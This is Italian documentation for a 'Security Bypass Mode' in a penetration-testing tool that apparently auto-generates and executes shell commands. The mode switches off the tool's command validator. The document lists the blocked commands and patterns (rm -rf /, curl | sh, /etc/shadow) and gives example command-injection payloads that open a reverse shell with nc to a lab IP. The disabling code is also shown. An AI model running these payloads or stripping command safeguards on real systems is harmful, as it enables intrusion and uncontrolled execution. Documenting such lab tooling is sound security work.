# 🔓 Security Bypass Mode

## ⚠️ ATTENZIONE

Il Security Bypass Mode **disabilita tutte le validazioni di sicurezza** ed è **ESTREMAMENTE PERICOLOSO**.

**Usare SOLO in**:
- ✅ Ambiente di test isolato (VM, container)
- ✅ Lab di penetration testing
- ✅ Sandbox dedicato

**NON usare MAI in**:
- ❌ Sistema produzione
- ❌ Rete aziendale
- ❌ Ambiente con dati sensibili

---

## 🎯 Scopo

Il bypass permette di:
- Testare exploit reali senza blocchi
- Eseguire comandi potenzialmente pericolosi
- Bypassare validazioni per ricerca

---

## 🔧 Come Attivare

### UI Web:
1. Apri http://localhost:5000
2. Abilita checkbox **🔓 Bypass Security**
3. Conferma nel terminale: `⚠️ Security bypass ATTIVO`

### Log Atteso:
```
[Security] ⚠️ SECURITY BYPASS ATTIVO per: curl -X POST ... nc -e /bin/sh ...
[Security] [SECURITY] Permesso: curl -X POST ...
```

---

## 🛡️ Protezioni Che Vengono Disabilitate

### 1. **Command Blacklist**
```python
# BLOCCATI normalmente:
- sudo, su, passwd
- systemctl, service
- adduser, useradd
- rm -rf /
- mkfs, fdisk
```
↑ **TUTTI permessi con bypass attivo**

### 2. **Pattern Pericolosi**
```python
# BLOCCATI normalmente:
- | bash (pipeline to bash)
- curl ... | sh (download and execute)
- > /dev/sda (write to disk)
- fork bomb
```
↑ **TUTTI permessi con bypass attivo**

### 3. **File Sensibili**
```python
# BLOCCATI normalmente:
- /etc/passwd
- /etc/shadow
```
↑ **Accessibili con bypass attivo**

---

## 📊 Modalità Operative

### Normale (Default)
```
User Request
    ↓
Command Generation
    ↓
Security Validator ← Blocca comandi pericolosi
    ↓
Execution (solo comandi sicuri)
```

### Bypass Attivo 🔓
```
User Request
    ↓
Command Generation
    ↓
Security Validator ← BYPASS (permette tutto)
    ↓
Execution (anche comandi pericolosi)
```

---

## 🔍 Implementazione

### Frontend (`frontend/static/script.js`)
```javascript
let securityBypass = false;

securityBypassToggle.addEventListener("change", () => {
    securityBypass = securityBypassToggle.checked;
    if (securityBypass) {
        addTerminalLine("warning", "[SECURITY]", 
            "⚠️ Security bypass ATTIVO - Solo per test in ambiente sicuro!");
    }
});

// Invia al backend
fetch("/deepstep", {
    body: JSON.stringify({
        message: text,
        security_bypass: securityBypass  // 🔓 Flag
    })
});
```

### Backend (`backend/app.py`)
```python
@app.route("/deepstep", methods=["POST"])
def deepstep():
    data = request.get_json(silent=True)
    security_bypass = data.get("security_bypass", False)
    
    # Salva in sessione per accesso globale
    session['security_bypass'] = security_bypass
```

### Security Layer (`tools/security.py`)
```python
@classmethod
def validate_command(cls, command: str, bypass: bool = False):
    # 🔓 BYPASS MODE
    if bypass:
        logger.warning(f"⚠️ SECURITY BYPASS ATTIVO per: {command[:80]}")
        return True, "Security bypass enabled"
    
    # ... validazioni normali ...
```

### Command Executor (`backend/core/tools.py`)
```python
def execute_bash_command(command: str) -> str:
    from flask import session
    
    # Leggi bypass dalla sessione
    bypass_enabled = session.get('security_bypass', False)
    
    # Passa a validator
    is_valid, reason = SecurityValidator.validate_command(
        command, 
        bypass=bypass_enabled
    )
```

---

## 🎨 UI Styling

Il checkbox bypass ha styling speciale per evidenziare il pericolo:

```css
.checkbox-label.security-bypass {
  border: 1px solid rgba(255, 100, 100, 0.3);
  background: rgba(255, 100, 100, 0.05);
}

.checkbox-label.security-bypass .checkbox-text {
  color: #ff6464;  /* Rosso */
  font-weight: 600;
}
```

**Aspetto**:
```
┌─────────────────────────────┐
│ ☑ ⚡ Deep Step              │
│ ☑ 🔓 Bypass Security  ← ROSSO│
└─────────────────────────────┘
```

---

## 📝 Esempi d'Uso

### Caso 1: Test Reverse Shell

**Senza Bypass**:
```bash
# Comando generato:
curl -X POST http://192.168.1.12:8009/api -d 'cmd=nc -e /bin/sh 192.168.1.10 4444'

# Risultato:
❌ [Security] Pattern pericoloso: | sh
❌ Comando bloccato
```

**Con Bypass**:
```bash
# Stesso comando:
curl -X POST http://192.168.1.12:8009/api -d 'cmd=nc -e /bin/sh 192.168.1.10 4444'

# Risultato:
✅ [Security] ⚠️ SECURITY BYPASS ATTIVO
✅ Comando eseguito
```

### Caso 2: Exploit Payload

**Senza Bypass**:
```bash
echo '$(id)' | nc 192.168.1.12 8009

# Risultato:
❌ Pattern pericoloso rilevato
```

**Con Bypass**:
```bash
echo '$(id)' | nc 192.168.1.12 8009

# Risultato:
✅ Eseguito (bypass attivo)
```

---

## 🔒 Best Practices

### 1. **Usa Sempre in VM/Container**
```bash
# Setup ambiente sicuro
docker run -it --rm kalilinux/kali-rolling bash
# Oppure
VirtualBox VM isolata
```

### 2. **Disabilita Subito Dopo Test**
```
✅ Test completato → Disattiva bypass
✅ Chiudi sessione → Bypass reset automatico
```

### 3. **Monitor Comandi Eseguiti**
```
Tutti i comandi con bypass vengono loggati:
[Security] ⚠️ SECURITY BYPASS ATTIVO per: <comando>
```

### 4. **Network Isolation**
```bash
# Isola rete VM
VBoxManage modifyvm "KaliTest" --nic1 intnet
```

---

## 🚨 Indicatori Visivi

### UI Warning:
- Checkbox rosso con bordo
- Messaggio nel terminale
- Log costanti

### Log Warning:
```
[Security] ⚠️ SECURITY BYPASS ATTIVO per: rm -rf /tmp/test
[SECURITY] Permesso: rm -rf /tmp/test (BYPASS MODE)
```

---

## 🧪 Test Scenarios

### Test Exploit RCE:
```
1. Attiva bypass
2. Request: "test command injection su 192.168.1.12"
3. Sistema genera: curl -X POST ... -d 'cmd=nc -e /bin/sh ...'
4. ✅ Eseguito (senza blocco)
```

### Test Privilege Escalation:
```
1. Attiva bypass
2. Request: "test sudo exploit"
3. Sistema genera: sudo -l; sudo ...
4. ✅ Eseguito (normalmente bloccato)
```

---

## 📊 Logging

Tutti i comandi con bypass vengono tracciati:

```python
# In tools/security.py
if bypass:
    logger.warning(f"⚠️ SECURITY BYPASS ATTIVO per: {command[:80]}")
    auditor.log_security_event(
        event_type="bypass_used",
        command=command,
        severity="critical"
    )
```

---

## 🔐 Reset Automatico

Il bypass si **resetta automaticamente**:

1. **Fine sessione browser**: Reload → bypass disattivato
2. **Restart Flask**: Nuovo avvio → bypass disattivato
3. **Timeout sessione**: Dopo X minuti → bypass disattivato

**Default**: Sempre disattivato all'avvio

---

## ⚖️ Disclaimer Legale

⚠️ **RESPONSABILITÀ UTENTE**

L'uso del Security Bypass Mode è a **totale rischio dell'utente**. 

Il bypass:
- Disabilita protezioni critiche
- Permette esecuzione codice arbitrario
- Può danneggiare il sistema
- È pensato SOLO per lab/test

**Utilizzare con estrema cautela!**

---

**Versione**: 3.0.0  
**Feature Added**: 3 Ottobre 2025  
**Status**: ✅ Implementato

